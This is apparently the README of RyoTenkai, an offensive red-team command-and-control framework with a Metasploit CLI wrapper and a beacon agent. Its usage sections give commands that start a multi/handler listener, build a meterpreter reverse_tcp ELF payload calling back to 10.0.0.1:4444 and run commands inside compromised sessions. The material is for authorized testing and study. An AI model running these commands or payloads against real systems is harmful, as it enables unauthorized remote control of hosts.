<div align="center">

```
 ____            _____          _         _    ____ ____
|  _ \ _   _  __|_   _|__ _ __ | | ____ _(_)  / ___|___ \
| |_) | | | |/ _ \| |/ _ \ '_ \| |/ / _` | | | |     __) |
|  _ <| |_| | (_) | |  __/ | | |   < (_| | | | |___ / __/
|_| \_\\__, |\___/|_|\___|_| |_|_|\_\__,_|_|  \____|_____|
       |___/
```

# RyoTenkai · 両転回

**A lab-grade Command-and-Control framework + Metasploit driver for authorized red-team work.**

[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/)
[![Tests](https://img.shields.io/badge/tests-48%20passing-brightgreen.svg)](tests/)
[![Status](https://img.shields.io/badge/status-experimental-orange.svg)](#roadmap)
[![Made by](https://img.shields.io/badge/made%20by-d3vn0mi-black.svg)](https://github.com/d3vn0mi)

</div>

> ⚠️ **Authorized use only.** RyoTenkai is offensive-security tooling built for education, CTFs, and engagements you have **written permission** to run. It is lab software — not production-hardened. You are responsible for staying inside the law and your scope. See [Legal & authorized use](#legal--authorized-use).

---

## What is this

RyoTenkai is an early-stage, education / red-team **Command-and-Control (C2) framework**. It has two faces:

1. **`ryo` — the Metasploit CLI** (`ryotenkai.py`). A clean, layered, unit-tested wrapper over `pymetasploit3`. Run modules, poll jobs/sessions, drive sessions, generate payloads — either as one-shot subcommands that emit JSON (Ansible-friendly) or through an `msfconsole`-style interactive REPL. **This is the mature part of the project.**
2. **The Django C2 server** (`ryotenkai_gui/`). A dashboard + REST API that manages beacons on target hosts, assigns shell tasks, and tracks Metasploit jobs/sessions. **Work in progress** — see the [roadmap](#roadmap) and [known gaps](#known-gaps).

This repo is four loosely-coupled pieces, not one integrated app. Maturity varies — the table below is honest about it.

## Components

| Piece | Path | What it does | Maturity |
|-------|------|--------------|----------|
| **Metasploit CLI / REPL** | `ryotenkai.py` | Layered MSF driver: connection → pure data fns → table/JSON presentation → interactive `RtkConsole`. Unit-tested. | ✅ Mature |
| **Django C2 server** | `ryotenkai_gui/` | Beacon mgmt, task assignment, dashboard, REST API; persists `Beacon`/`Task`/`Session`/`Job` to SQLite. | 🚧 WIP |
| **Beacon agent** | `agent.py` | Runs on target: check in, sleep `[min,max]`, execute tasks, post results. | 🚧 Incomplete |
| **Flask C2 prototype** | `ryotenkai_c2.py` | Minimal in-memory alternate C2 (`/beacon`, `/beacon/result`). | 🧪 Legacy/demo |

The CLI is **independent of Django** — the Django app reimplements its own simpler Metasploit calls in `command_centre/utils.py`.

---

## Quickstart (CLI)

The CLI is the fastest way to see RyoTenkai working. You need a reachable `msfrpcd` (Metasploit RPC daemon).

```sh
# 1. Clone
git clone https://github.com/d3vn0mi/RyoTenkai.git
cd RyoTenkai

# 2. Install (exposes the `ryo` command). --no-deps if deps are already present.
python3 -m venv venv && source venv/bin/activate
pip install -e .

# 3. Point config.ini [default] at your msfrpcd (host/port/password/ssl),
#    or export RTK_RPC_* env vars (see Configuration).

# 4. Start the Metasploit RPC daemon (or run your own)
ryo start_rpc

# 5. Drop into the interactive console
ryo interactive
```

Every command is available as `ryo <subcommand>` after install, or run in place with `python ryotenkai.py <subcommand>` — they are equivalent.

Run the test suite (mock RPC — no live msfrpcd needed):

```sh
pip install -e ".[test]"   # or: pip install -r requirements.txt
pytest                     # 48 passing; pytest.ini disables a broken global plugin
```

---

## Usage guide

The CLI has two modes that share one data layer:

- **Non-interactive subcommands** print structured **JSON** to stdout (stable contract for Ansible / scripting).
- **Interactive REPL** renders human-readable tables by default (toggle with `set output json`).

### Non-interactive subcommands

```sh
# Run any module via a console (run -j) and get structured output
ryo run_module multi/handler --option LHOST=10.0.0.1 --option LPORT=4444
#   options accept OPTION=VALUE (preferred) or "OPTION VALUE"

# Poll active jobs / sessions (JSON)
ryo get_jobs
ryo get_sessions

# Run command(s) inside an existing session
ryo run_command 4 "whoami" "id"

# Generate a payload with msfvenom
ryo generate_payload elf linux/x64/meterpreter/reverse_tcp 10.0.0.1 4444 out.elf

# Launch the Metasploit RPC daemon
ryo start_rpc
```

Every subcommand above writes JSON to stdout — pipe it straight into `jq` or an Ansible task.

### Interactive REPL

```sh
ryo interactive
```

An `msfconsole`-style console over a persistent RPC client (command history at `~/.rtk_history`):

| Command | Action |
|---------|--------|
| `use <module>` | select a module |
| `set <OPT> <VAL>` | set a module option |
| `unset <OPT>` | clear an option |
| `options` | show current module + options |
| `run` / `exploit` | run the current module (`run -j`) |
| `back` | clear current module |
| `jobs` / `jobs -k <id>` | list / kill jobs |
| `sessions` / `sessions -i <id>` | list / interact with a session |
| `generate <fmt> <payload> <lhost> <lport> <outfile>` | build a payload |
| `set output json\|table` | switch output format |
| `connect` | show the active RPC connection |
| `help` / `?` | command reference |
| `exit` / `quit` | leave the console |

Inside `sessions -i <id>`, type commands directly into the session; `background` or `Ctrl-D` returns to the main prompt (the session stays alive).

---

## Configuration

The CLI reads defaults from `config.ini [default]`:

```ini
[default]
rpc_password = msfrpc
rpc_server   = 10.192.0.3
rpc_port     = 55559
rpc_ssl      = True
```

Per-subcommand sections (`[run_module]`, `[generate_payload]`, …) hold reusable option presets.

**Connection precedence** (resolved by `resolve_conn`): `--rpc-* flag` > env var > `config.ini [default]` > built-in default. The env vars are `RTK_RPC_PASSWORD`, `RTK_RPC_SERVER`, `RTK_RPC_PORT`, `RTK_RPC_SSL`:

```sh
export RTK_RPC_PASSWORD=s3cret RTK_RPC_SERVER=10.0.0.9 RTK_RPC_PORT=55559
ryo --rpc-ssl get_jobs        # force SSL on for this run; --no-rpc-ssl forces it off
```

> ℹ️ SSL is now config/env-driven (the old "`rpc_ssl` is ignored" caveat is fixed). Force it per-run with `--rpc-ssl` / `--no-rpc-ssl`. Note: `ryo` reads `./config.ini` from the **current directory** — when running from elsewhere, supply connection settings via the `RTK_RPC_*` env vars (they work from anywhere).

---

## Django C2 (work in progress)

The real C2 server lives in `ryotenkai_gui/` (Django 4.2, app `command_centre`).

```sh
cd ryotenkai_gui
python manage.py makemigrations command_centre   # migrations are NOT committed — generate first
python manage.py migrate
python manage.py runserver                        # http://127.0.0.1:8000/
```

Beacon ↔ C2 flow: `agent.py` → `POST /api/check_in/` → operator assigns work via `POST /api/assign_task/` → beacon returns output via `POST /api/receive_result/`.

The Django app needs `django` (4.2) and `requests` (and `flask` for the prototype) installed separately — `requirements.txt` currently pins **CLI deps only**.

### Known gaps

The tree has real cross-file mismatches (being worked through on the roadmap):

- `agent.py` posts results to `/receive_result` but the route is `/api/receive_result/`.
- The agent never pulls tasks — the task-fetch half of the loop is unimplemented.
- `check_in` view calls `timezone.now()` without importing it (`NameError`).
- `jobs_sessions` view renders `jobs_sessions.html`; the file on disk is `job_sessions.html`.
- Metasploit creds differ between Django (`utils.py`, `msfpassword`:55552) and the CLI (`config.ini`, 55559).

> All REST endpoints are `@csrf_exempt` and unauthenticated; `settings.py` is dev-only (`DEBUG=True`, hardcoded `SECRET_KEY`). Do not expose this server.

---

## Roadmap

Reality-based and phased. ✅ = done, the rest is planned.

- **✅ Phase 0 — CLI foundation:** layered architecture, interactive REPL, JSON stdout contract, config-key fix.
- **✅ Phase 1 — Packaging & config:** `pip install` with the `ryo` console entrypoint, single source of truth for connection params (`resolve_conn`: CLI > env > config > default), `rpc_ssl` honored from config/env (48-test suite).
- **Phase 2 — RPC perf & reliability:** persistent client reuse, adaptive (non-fixed) polling, reconnect/timeout handling, cached jobs/sessions.
- **Phase 3 — REPL UX:** live module/option tab-completion (queried from msf), `search`, colored output, history search, sharper errors.
- **Phase 4 — Metasploit coverage:** `info`, kill/upgrade sessions, db/creds/loot read.
- **Phase 5+ — Django C2:** fix the [known gaps](#known-gaps), implement the task-pull loop, then C2 features — beacon grouping, encrypted comms, multi-operator auth, real-time dashboard.

Detailed CLI design: [`docs/superpowers/specs/2026-06-16-ryotenkai-cli-optimization-design.md`](docs/superpowers/specs/2026-06-16-ryotenkai-cli-optimization-design.md).

---

## Project layout

```
ryotenkai.py            # ryo CLI + interactive REPL (the mature core)
agent.py                # beacon agent (target-side)
ryotenkai_c2.py         # Flask C2 prototype (legacy)
config.ini              # CLI connection + per-command presets
tests/                  # pytest suite (mock RPC client)
ryotenkai_gui/          # Django C2 server (WIP)
docs/                   # specs & implementation plans
```

---

## Contributing

Issues and PRs welcome. Keep two contracts intact: non-interactive subcommands emit JSON on stdout, and pure data functions return data (presentation stays in the `format_*` layer). Add tests with behavior — the suite runs against a mock RPC client, so no live msfrpcd is required.

## Legal & authorized use

RyoTenkai exists for **authorized** security testing, research, and education. Using it against systems you do not own or lack explicit written permission to test is illegal in most jurisdictions. The author assumes no liability for misuse. Stay in scope, stay legal.

## License

Licensed under the **Apache License 2.0** — see [LICENSE](LICENSE).

## Author

Built by **[d3vn0mi](https://github.com/d3vn0mi)** · [github.com/d3vn0mi/RyoTenkai](https://github.com/d3vn0mi/RyoTenkai)
